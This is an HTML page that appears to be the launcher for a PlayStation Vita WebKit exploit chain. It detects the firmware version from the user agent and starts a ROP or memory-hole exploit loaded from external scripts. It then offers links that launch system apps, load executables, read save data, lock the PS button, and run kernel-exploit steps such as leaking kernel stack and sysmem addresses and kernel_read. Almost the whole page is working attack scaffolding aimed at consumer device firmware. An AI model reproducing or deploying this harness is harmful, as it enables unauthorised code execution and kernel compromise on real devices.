<html>
<head>

<script src="gadgets.js"></script>
<script src="rop.js"></script>
<script src="oldpsvita_exploit.js"></script>
<script src="utils.js"></script>

<script src="fw_defines.js"></script>
<script src="rop_scrollleft.js"></script>
<script src="200_320_exploit.js"></script>

<script type="text/javascript">
const UNK = 0;
const PSP = 1;
const PSVITA = 2;
const PS3 = 3;
const PS4 = 4;
window.device = UNK;

function postLoad() {
	if (navigator.userAgent.substring(0, 29).localeCompare("Mozilla/5.0 (PlayStation Vita") == 0)
		window.device = PSVITA;

	if (window.device == PSVITA) {
		//alert(navigator.userAgent);
		var fwFromUA = navigator.userAgent.substring(navigator.userAgent.indexOf("5.0 (PlayStation Vita ")+22, navigator.userAgent.indexOf(") Apple"));
		var fw_major_string = fwFromUA.substring(fwFromUA.indexOf(""), fwFromUA.indexOf("."));
		var fw_minor_string = fwFromUA.substring(fwFromUA.indexOf(".")+3, fwFromUA.indexOf(fw_major_string)+2);
		window.psvita_fw = parseInt(fw_major_string) * 100 + parseInt(fw_minor_string);
		//alert(window.psvita_fw);
		
		if (window.psvita_fw < 200) {
			window.old_fw = true;
			//get_module_bases(); // not working
			oldpsvita_initROP();
		} else if (window.psvita_fw >= 200 && window.psvita_fw <= 320) {
			var aspace = initMemoryHole();
			if (aspace != -1) {
				logdbg("Initialization success.");
			} else {
				//alert("initMemoryHole failed");
				logdbg("Initialization failed.");
				location.reload();
			}
		} else if (window.psvita_fw >= 330 && window.psvita_fw <= 336) {
			// vitasploit 33x
		} else if (window.psvita_fw >= 350 && window.psvita_fw <= 360) {
			// henkaku webkit
		} else
			alert("unsupported PSVita FW");
	}
}
</script>
</head>
<body id="BodyID" onload="postLoad();">
<div id="exploit"></div>
<a href="javascript:print_mod_list();">print_mod_list</a><br/>

SceAppMgr<br/>
<a href="javascript:sceAppMgrLaunchAppByUri(0xFFFFF, 'psgm:open?titleid=NPXS10018');">open SignUp</a><br/>
<a href="javascript:sceAppMgrLaunchAppByUri(0xFFFFF, 'psgm:open?titleid=NPXS10031');">open Package Installer</a><br/>
<a href="javascript:sceAppMgrLaunchAppByUri_user();">sceAppMgrLaunchAppByUri_user</a><br/>
<a href="javascript:sceAppMgrLoadExec('app0:eboot.bin');">sceAppMgrLoadExec('app0:eboot.bin');</a><br/>

SceIofilemgr<br/>
<a href="javascript:list_dir('savedata0:');">list_dir("savedata0:");</a><br/>
<a href="javascript:list_dir('savedata0:/sce_sys/');">list_dir("savedata0:/sce_sys/");</a><br/>
<a href="javascript:IoWriteTest();">IoWriteTest</a><br/>
<a href="javascript:IoReadTest();">IoReadTest</a><br/>


SceShellSvc<br/>
<a href="javascript:sceShellUtilInitEvents(0);">sceShellUtilInitEvents</a><br/>
<a href="javascript:sceShellUtilLock(0xFFF);">Lock PS Button</a><br/>
<a href="javascript:sceShellUtilUnlock(0xFFF);">Unlock PS Button</a><br/>


SceSysmem<br/>
<a href="javascript:sceKernelAllocMemBlock_test();">sceKernelAllocMemBlock_test</a><br/>


SceWebFiltering<br/>
<a href="javascript:SceWebFiltering_BFFD2DB1_test();">SceWebFiltering_BFFD2DB1_test</a><br/>


<br/>kxploit<br/>
<a href="javascript:Load_SceNgsUser();">Load SceNgsUser</a><br/>
<a href="javascript:ngs_init();">ngs_init</a><br/>
<a href="javascript:get_kstack_addr();">get_kstack_addr</a><br/>
<a href="javascript:leak_sysmem_ngsuser();">leak_sysmem_ngsuser</a><br/>
<a href="javascript:kernel_read();">kernel_read</a><br/>

<div id="log"></div>
</body>
</html>